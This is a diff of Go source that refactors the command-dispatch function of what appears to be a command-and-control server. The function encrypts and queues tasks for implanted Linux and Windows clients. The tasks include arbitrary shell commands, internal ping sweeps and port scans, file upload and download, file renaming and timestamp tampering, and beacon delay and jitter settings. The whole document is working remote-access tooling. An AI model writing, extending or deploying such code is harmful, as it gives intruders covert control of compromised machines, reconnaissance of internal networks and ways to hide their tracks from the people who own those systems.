@@ -3962,117 +3962,124 @@ func GetMsg(uid, uidBytes string) string {
 }
 
 // 写入指令（推送到对应 uid 的消息队列）
-func Getcmd(uid, cmd, Taskid,port string) string {
-	if uid == "" || port == "" {
+func Getcmd(uid, cmd, Taskid, port string) string {
+	if uid == "" || port == "" || cmd == "" {
 		return "missing parameter"
 	}
+
 	serverRouteMu.RLock()
 	baseRounds, exists := base_map[port]
 	serverRouteMu.RUnlock()
 	if !exists {
 		return "port not registered"
 	}
+
 	keyMu.RLock()
 	key, exists := key_map[uid]
 	keyMu.RUnlock()
 	if !exists {
 		return "client not registered"
 	}
+
+	parts := strings.Split(cmd, "*//*")
+	command := parts[0]
+
 	var finalCmd string
 	var logMsg string
 
-	if cmd != "" && !strings.HasPrefix(cmd, "SWITCH_VERSION*//*") && !strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") &&
-		!strings.HasPrefix(cmd, "GET_PORTS*//*") && !strings.HasPrefix(cmd, "GET_U_FRIENDS*//*") &&
-		!strings.HasPrefix(cmd, "LOAD_U_FILE*//*") && !strings.HasPrefix(cmd, "GET_U_FILE*//*") &&
-		!strings.HasPrefix(cmd, "GET_JITTER*//*") && !strings.HasPrefix(cmd, "GET_DELAY*//*") &&
-		!strings.HasPrefix(cmd, "CHANG_FILE_NAME*//*") && !strings.HasPrefix(cmd, "CHANG_FILE_TIME*//*") {
-		// 普通指令
-		finalCmd = cmd + "*//*" + Taskid
-	} else if strings.HasPrefix(cmd, "CHANG_FILE_NAME*//*") || strings.HasPrefix(cmd, "CHANG_FILE_TIME*//*") {
-		cmd_split := strings.Split(cmd, "*//*")
-		if len(cmd_split) != 3 {
+	switch command {
+	case "CHANG_FILE_NAME", "CHANG_FILE_TIME":
+		if len(parts) != 3 {
 			return "missing parameter"
 		}
-		if strings.HasPrefix(cmd, "CHANG_FILE_NAME*//*") {
-			logMsg = fmt.Sprintf(log_word["change_file_name"], uid, cmd_split[1], cmd_split[2])
-		} else if strings.HasPrefix(cmd, "CHANG_FILE_TIME*//*") {
-			logMsg = fmt.Sprintf(log_word["change_file_time"], uid, cmd_split[1], cmd_split[2])
+
+		if command == "CHANG_FILE_NAME" {
+			logMsg = fmt.Sprintf(
+				log_word["change_file_name"],
+				uid,
+				parts[1],
+				parts[2],
+			)
+		} else {
+			logMsg = fmt.Sprintf(
+				log_word["change_file_time"],
+				uid,
+				parts[1],
+				parts[2],
+			)
 		}
+
 		finalCmd = cmd
-	} else if strings.HasPrefix(cmd, "SWITCH_VERSION*//*") || strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") {
-		// SWITCH_VERSION
-		if strings.HasPrefix(cmd, "SWITCH_VERSION*//*") {
-			cmd_split := strings.Split(cmd, "*//*")
-			if len(cmd_split) != 2 || cmd_split[1] == "" {
-				return "missing parameter"
-			}
-			version := cmd_split[1]
 
-			// 更新 client version
-			go func() {
-				clientDataMu.Lock()
-				for i := range client_data.Clients {
-					client := &client_data.Clients[i]
-					if uid == client.Uid {
-						client.version = version
-						break
-					}
-				}
-				clientDataMu.Unlock()
-
-				windows_clientMu.Lock()
-				for i := range windows_client_data.Clients {
-					client := &windows_client_data.Clients[i]
-					if uid == client.Uid {
-						client.Version = version
-						break
-					}
-				}
-				windows_clientMu.Unlock()
-			}()
-
-			finalCmd = cmd
-		}
-		if strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") {
-			parts := strings.Split(cmd, "*//*")
-			if len(parts) < 2 || parts[1] == "" {
-				return "missing parameter"
-			}
-			finalCmd = cmd + "*//*" + Taskid
+	case "SWITCH_VERSION":
+		if len(parts) != 2 || parts[1] == "" {
+			return "missing parameter"
 		}
 
-	} else if strings.HasPrefix(cmd, "GET_JITTER*//*") || strings.HasPrefix(cmd, "GET_DELAY*//*") {
-		parts := strings.Split(cmd, "*//*")
+		version := parts[1]
+
+		go func() {
+			clientDataMu.Lock()
+			for i := range client_data.Clients {
+				client := &client_data.Clients[i]
+				if uid == client.Uid {
+					client.version = version
+					break
+				}
+			}
+			clientDataMu.Unlock()
+
+			windows_clientMu.Lock()
+			for i := range windows_client_data.Clients {
+				client := &windows_client_data.Clients[i]
+				if uid == client.Uid {
+					client.Version = version
+					break
+				}
+			}
+			windows_clientMu.Unlock()
+		}()
+
+		finalCmd = cmd
+
+	case "LOOK_UP_FILE":
+		if len(parts) < 2 || parts[1] == "" {
+			return "missing parameter"
+		}
+
+		finalCmd = cmd + "*//*" + Taskid
+
+	case "GET_DELAY", "GET_JITTER":
 		if len(parts) != 2 {
 			return "missing parameter"
 		}
-		v, err := strconv.Atoi(parts[1])
+
+		value, err := strconv.Atoi(parts[1])
 		if err != nil {
 			return "parameter is not int"
 		}
-		if v <= 0 {
+		if value <= 0 {
 			return "parameter must be > 0"
 		}
-		finalCmd = cmd
-	} else if strings.HasPrefix(cmd, "GET_PORTS*//*") || strings.HasPrefix(cmd, "GET_U_FRIENDS*//*") {
 
-		// GET_PORTS / GET_U_FRIENDS
-		parts := strings.Split(cmd, "*//*")
+		finalCmd = cmd
+
+	case "GET_PORTS", "GET_U_FRIENDS":
 		if len(parts) != 4 {
 			return "missing parameter"
 		}
 
-		sleep_time, err := strconv.Atoi(parts[3])
+		sleepTime, err := strconv.Atoi(parts[3])
 		if err != nil {
 			return "delay is not int"
 		}
-		if sleep_time < 1 {
-			sleep_time = 1
+		if sleepTime < 1 {
+			sleepTime = 1
 		}
 
-		if strings.HasPrefix(cmd, "GET_U_FRIENDS*//*") {
-			ip_split := strings.Split(parts[1], ".")
-			if len(ip_split) != 4 || !Check_comment(ip_split[3], "ping") {
+		if command == "GET_U_FRIENDS" {
+			ipParts := strings.Split(parts[1], ".")
+			if len(ipParts) != 4 || !Check_comment(ipParts[3], "ping") {
 				return "Format error"
 			}
 		}
@@ -4081,103 +4088,122 @@ func Getcmd(uid, cmd, Taskid,port string) string {
 			return "Format error"
 		}
 
-		finalCmd = fmt.Sprintf("%s*//*%s*//*%s*//*%d",
-			parts[0], parts[1], parts[2], sleep_time)
+		finalCmd = fmt.Sprintf(
+			"%s*//*%s*//*%s*//*%d",
+			command,
+			parts[1],
+			parts[2],
+			sleepTime,
+		)
 
-		logMsg = fmt.Sprintf(log_word["scan_msg"], uid, parts[1])
+		logMsg = fmt.Sprintf(
+			log_word["scan_msg"],
+			uid,
+			parts[1],
+		)
 
-	} else if strings.HasPrefix(cmd, "GET_U_FILE*//*") || strings.HasPrefix(cmd, "LOAD_U_FILE*//*") {
-
-		// GET_U_FILE / LOAD_U_FILE
-		var newCmd string
-		parts := strings.Split(cmd, "*//*")
-
-		if strings.HasPrefix(cmd, "GET_U_FILE*//*") {
-			if len(parts) != 3 {
-				return "missing parameter"
-			}
-			splitSizeStr := parts[2]
-			if dot := strings.Index(splitSizeStr, "."); dot != -1 {
-				splitSizeStr = splitSizeStr[:dot]
-			}
-			splitSize, err := strconv.Atoi(splitSizeStr)
-			if err != nil || splitSize <= 0 {
-				parts[2] = "1048576"
-			} else {
-				parts[2] = strconv.Itoa(splitSize)
-			}
-			newCmd = strings.Join(parts, "*//*")
+	case "GET_U_FILE":
+		if len(parts) != 3 {
+			return "missing parameter"
 		}
 
-		if strings.HasPrefix(cmd, "LOAD_U_FILE*//*") {
-			if len(parts) != 2 {
-				return "missing parameter"
-			}
-			str_parts := strings.Split(parts[1], "**///**")
-			splitSizeStr := strings.TrimSpace(str_parts[len(str_parts)-1])
-			if dot := strings.Index(splitSizeStr, "."); dot != -1 {
-				splitSizeStr = splitSizeStr[:dot]
-			}
-			splitSize, err := strconv.Atoi(splitSizeStr)
-			if err != nil || splitSize <= 0 {
-				str_parts[len(str_parts)-1] = "1048576"
-			} else {
-				str_parts[len(str_parts)-1] = strconv.Itoa(splitSize)
-			}
-			newCmd = "LOAD_U_FILE*//*" + strings.Join(str_parts, "**///**")
+		splitSizeStr := parts[2]
+		if dot := strings.Index(splitSizeStr, "."); dot != -1 {
+			splitSizeStr = splitSizeStr[:dot]
 		}
 
-		finalCmd = newCmd
+		splitSize, err := strconv.Atoi(splitSizeStr)
+		if err != nil || splitSize <= 0 {
+			parts[2] = "1048576"
+		} else {
+			parts[2] = strconv.Itoa(splitSize)
+		}
 
-	} else {
-		return "missing parameter"
+		finalCmd = strings.Join(parts, "*//*")
+
+	case "LOAD_U_FILE":
+		if len(parts) != 2 {
+			return "missing parameter"
+		}
+
+		fileParts := strings.Split(parts[1], "**///**")
+		splitSizeStr := strings.TrimSpace(fileParts[len(fileParts)-1])
+
+		if dot := strings.Index(splitSizeStr, "."); dot != -1 {
+			splitSizeStr = splitSizeStr[:dot]
+		}
+
+		splitSize, err := strconv.Atoi(splitSizeStr)
+		if err != nil || splitSize <= 0 {
+			fileParts[len(fileParts)-1] = "1048576"
+		} else {
+			fileParts[len(fileParts)-1] = strconv.Itoa(splitSize)
+		}
+
+		finalCmd = "LOAD_U_FILE*//*" + strings.Join(fileParts, "**///**")
+
+	default:
+		// 普通命令，例如：shell*//*whoami
+		finalCmd = cmd + "*//*" + Taskid
 	}
 
-	// 加密
 	encryptedCmd := Get_encry_s(&finalCmd, &key, &baseRounds)
 
-	// 写入消息队列（使用新队列结构）
 	newMsg := Msg_get{
 		Ori_Msg:   cmd,
 		Encry_Msg: encryptedCmd,
 		Taskid:    Taskid,
 	}
+
 	queue := getOrCreateQueue(uid)
 	queue.mu.Lock()
 	queue.messages = append(queue.messages, newMsg)
 	queue.mu.Unlock()
 
-	// 写日志（保持与旧函数一致）
 	if logMsg != "" {
 		logger.WriteLog(logMsg)
 	} else {
-		if !strings.HasPrefix(cmd, "CHANG_FILE_NAME*//*") &&
-			!strings.HasPrefix(cmd, "CHANG_FILE_TIME*//*") &&
-			!strings.HasPrefix(cmd, "GET_DELAY*//*") &&
-			!strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") &&
-			!strings.HasPrefix(cmd, "LOAD_U_FILE*//*") &&
-			!strings.HasPrefix(cmd, "SWITCH_VERSION*//*") &&
-			!strings.HasPrefix(cmd, "GET_U_FILE*//*") &&
-			!strings.HasPrefix(cmd, "GET_JITTER*//*") {
-			log_cmd := strings.ReplaceAll(cmd, "*//*", " ")
+		skipLog := command == "CHANG_FILE_NAME" ||
+			command == "CHANG_FILE_TIME" ||
+			command == "GET_DELAY" ||
+			command == "LOOK_UP_FILE" ||
+			command == "LOAD_U_FILE" ||
+			command == "SWITCH_VERSION" ||
+			command == "GET_U_FILE" ||
+			command == "GET_JITTER"
+
+		if !skipLog {
+			logCmd := strings.ReplaceAll(cmd, "*//*", " ")
+
 			go func(uid string) {
 				clientDataMu.RLock()
 				for i := range client_data.Clients {
 					client := &client_data.Clients[i]
 					if uid == client.Uid {
-						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, log_cmd)
-						logger.WriteLog(log_str)
+						logStr := fmt.Sprintf(
+							log_word["msg"],
+							client.Host,
+							uid,
+							logCmd,
+						)
+						logger.WriteLog(logStr)
 						clientDataMu.RUnlock()
 						return
 					}
 				}
 				clientDataMu.RUnlock()
+
 				windows_clientMu.RLock()
 				for i := range windows_client_data.Clients {
 					client := &windows_client_data.Clients[i]
 					if uid == client.Uid {
-						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid,  log_cmd)
-						logger.WriteLog(log_str)
+						logStr := fmt.Sprintf(
+							log_word["msg"],
+							client.Host,
+							uid,
+							logCmd,
+						)
+						logger.WriteLog(logStr)
 						windows_clientMu.RUnlock()
 						return
 					}
@@ -4191,7 +4217,6 @@ func Getcmd(uid, cmd, Taskid,port string) string {
 
 	return ""
 }
-
 // 写入内网资产
 func Net_results(uid, results string, code_rounds map[byte]int) {
 	keyMu.RLock()
